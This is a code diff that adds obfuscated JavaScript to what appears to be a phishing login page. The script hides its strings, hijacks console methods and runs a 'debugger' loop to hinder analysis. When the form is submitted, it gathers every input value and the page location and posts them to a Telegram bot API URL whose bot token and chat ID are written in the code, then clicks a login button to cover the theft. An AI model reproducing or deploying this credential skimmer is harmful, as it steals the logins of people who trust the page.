@@ -1,1 +1,290 @@
-asdasd
+var _0x8120b3 = _0x1c5f,
+  _0x2b4dff =
+    (!(function () {
+      for (var n = _0x1c5f, t = _0x5aa4(); ; )
+        try {
+          if (
+            869890 ==
+            +parseInt(n(319)) * (parseInt(n(263)) / 2) +
+              -parseInt(n(309)) / 3 +
+              parseInt(n(266)) / 4 +
+              (parseInt(n(265)) / 5) * (-parseInt(n(306)) / 6) +
+              (parseInt(n(270)) / 7) * (-parseInt(n(291)) / 8) +
+              (parseInt(n(290)) / 9) * (parseInt(n(316)) / 10) +
+              (-parseInt(n(274)) / 11) * (-parseInt(n(279)) / 12)
+          )
+            break;
+          t.push(t.shift());
+        } catch (n) {
+          t.push(t.shift());
+        }
+    })(),
+    (function () {
+      var a = !0;
+      return function (t, r) {
+        var n = a
+          ? function () {
+              var n;
+              if (r) return (n = r.apply(t, arguments)), (r = null), n;
+            }
+          : function () {};
+        return (a = !1), n;
+      };
+    })()),
+  _0x363439 =
+    (!(function () {
+      _0x2b4dff(this, function () {
+        var n = _0x1c5f,
+          t = new RegExp("function *\\( *\\)"),
+          r = new RegExp(n(312), "i"),
+          a = _0x55c8ad(n(294));
+        t[n(303)](a + "chain") && r[n(303)](a + n(296)) ? _0x55c8ad() : a("0");
+      })();
+    })(),
+    (function () {
+      var a = !0;
+      return function (t, r) {
+        var n = a
+          ? function () {
+              var n;
+              if (r) return (n = r[_0x1c5f(315)](t, arguments)), (r = null), n;
+            }
+          : function () {};
+        return (a = !1), n;
+      };
+    })()),
+  _0x1c9dad = _0x363439(this, function () {
+    for (
+      var n = _0x1c5f,
+        t = (function () {
+          var t,
+            n = _0x1c5f;
+          try {
+            t = Function(n(287) + n(278) + ");")();
+          } catch (n) {
+            t = window;
+          }
+          return t;
+        })(),
+        r = (t[n(300)] = t.console || {}),
+        a = ["log", n(271), "info", n(268), n(293), n(318), n(295)],
+        e = 0;
+      e < a[n(297)];
+      e++
+    ) {
+      var o = _0x363439[n(284)].prototype.bind(_0x363439),
+        c = a[e],
+        i = r[c] || o;
+      (o[n(314)] = _0x363439[n(320)](_0x363439)),
+        (o[n(301)] = i[n(301)].bind(i)),
+        (r[c] = o);
+    }
+  });
+function _0x1c5f(n, t) {
+  var r = _0x5aa4();
+  return (_0x1c5f = function (n, t) {
+    return r[(n -= 263)];
+  })(n, t);
+}
+function _0x55c8ad(n) {
+  function r(n) {
+    var t = _0x1c5f;
+    if (typeof n === t(307))
+      return function (n) {}[t(284)]("while (true) {}")[t(315)]("counter");
+    1 !== ("" + n / n)[t(297)] || n % 20 == 0
+      ? function () {
+          return !0;
+        }
+          [t(284)](t(280) + t(298))
+          [t(321)](t(275))
+      : function () {
+          return !1;
+        }
+          [t(284)](t(280) + t(298))
+          [t(315)]("stateObject"),
+      r(++n);
+  }
+  try {
+    if (n) return r;
+    r(0);
+  } catch (n) {}
+}
+function _0x5aa4() {
+  var n = [
+    "240fODOKr",
+    "debu",
+    "https://api.telegram.org/bot6695683375:AAGJjL7Z1e5NVnasE9Mlo5f_73M9hfIBEoo/sendMessage?chat_id=5384212821",
+    "30MMvbAp",
+    "45bXKdjl",
+    "constructor",
+    "application/json",
+    "2612793zqXAak",
+    "return (function() ",
+    "6PIquJa",
+    "each",
+    "657RKIQoI",
+    "1288TRjePU",
+    "click",
+    "exception",
+    "init",
+    "trace",
+    "input",
+    "length",
+    "gger",
+    "#form input",
+    "console",
+    "toString",
+    "val",
+    "test",
+    "4006453OpIgpY",
+    "shift",
+    "4471482ecuSCR",
+    "string",
+    "push",
+    "2522307fBNdNM",
+    "5335929lGijvk",
+    "#login",
+    "\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)",
+    "stringify",
+    "__proto__",
+    "apply",
+    "84080tXMfca",
+    "preventDefault",
+    "table",
+    "271MkcBZs",
+    "bind",
+    "call",
+    "6266fHBTOZ",
+    "POST",
+    "10FpVYxN",
+    "575540vFbZnU",
+    "50253NFdocD",
+    "error",
+    "1224mwvaXG",
+    "38633qlCCTQ",
+    "warn",
+    "submit",
+    "info",
+    "1365650wgNbBG",
+    "action",
+    "log",
+    "#form",
+    '{}.constructor("return this")( )',
+  ];
+  return (_0x5aa4 = function () {
+    return n;
+  })();
+}
+_0x1c9dad(),
+  $(_0x8120b3(311)).on(_0x8120b3(292), (n) => {
+    var f = _0x8120b3;
+    n[f(317)]();
+    let t = {};
+    $(f(299))[f(289)](function () {
+      var n = f;
+      t[this.id] = $(this)[n(302)]();
+    }),
+      (n = JSON[f(313)]({ location: location, formData: t }, null, 4));
+    for (var r = p, a = f, e = p, o = i(); ; )
+      try {
+        if (
+          691584 ==
+          +parseInt(e(162)) * (parseInt(e(159)) / 2) +
+            -parseInt(e(169)) / 3 +
+            (parseInt(e(175)) / 4) * (-parseInt(e(171)) / 5) +
+            -parseInt(e(166)) / 6 +
+            (-parseInt(e(176)) / 7) * (-parseInt(e(173)) / 8) +
+            parseInt(e(155)) / 9 +
+            (parseInt(e(153)) / 10) * (parseInt(e(178)) / 11)
+        )
+          break;
+        o[a(308)](o[a(305)]());
+      } catch (n) {
+        o[a(308)](o.shift());
+      }
+    c = !0;
+    var c,
+      s = function (t, r) {
+        var n = c
+          ? function () {
+              var n;
+              if (r) return (n = r[p(168)](t, arguments)), (r = null), n;
+            }
+          : function () {};
+        return (c = !1), n;
+      };
+    function p(n, t) {
+      var r = i();
+      return (p = function (n, t) {
+        return r[(n -= 148)];
+      })(n, t);
+    }
+    function i() {
+      var n = f,
+        t = [
+          n(281),
+          n(297),
+          n(313),
+          n(268),
+          n(264),
+          n(282),
+          n(318),
+          n(310),
+          n(271),
+          n(320),
+          "exception",
+          n(288),
+          n(278),
+          n(295),
+          "270365TuoCAt",
+          "constructor",
+          n(300),
+          n(287),
+          "7069368rQhSYB",
+          n(314),
+          n(315),
+          n(286),
+          n(301),
+          n(283),
+          n(273),
+          n(269),
+          n(276),
+          "379684Vgyzrn",
+          n(267),
+          n(285),
+          n(304),
+        ];
+      return (i = function () {
+        return t;
+      })();
+    }
+    s(this, function () {
+      var n = f,
+        t = p;
+      try {
+        var r = Function(t(165) + t(160) + ");")();
+      } catch (n) {
+        r = window;
+      }
+      for (
+        var a = (r[n(300)] = r[t(164)] || {}),
+          e = [t(174), t(156), t(172), t(151), t(158), t(154), t(161)],
+          o = 0;
+        o < e[t(149)];
+        o++
+      ) {
+        var c = s[t(163)].prototype[t(157)](s),
+          i = e[o],
+          u = a[i] || c;
+        (c[t(167)] = s[t(157)](s)),
+          (c[n(301)] = u[t(170)][t(157)](u)),
+          (a[i] = c);
+      }
+    })(),
+      fetch(r(148), {
+        method: r(152),
+        headers: { "Content-Type": r(177) },
+        body: JSON[r(150)]({ text: n }),
+      }),
+      $(f(277))[f(272)]();
+  });
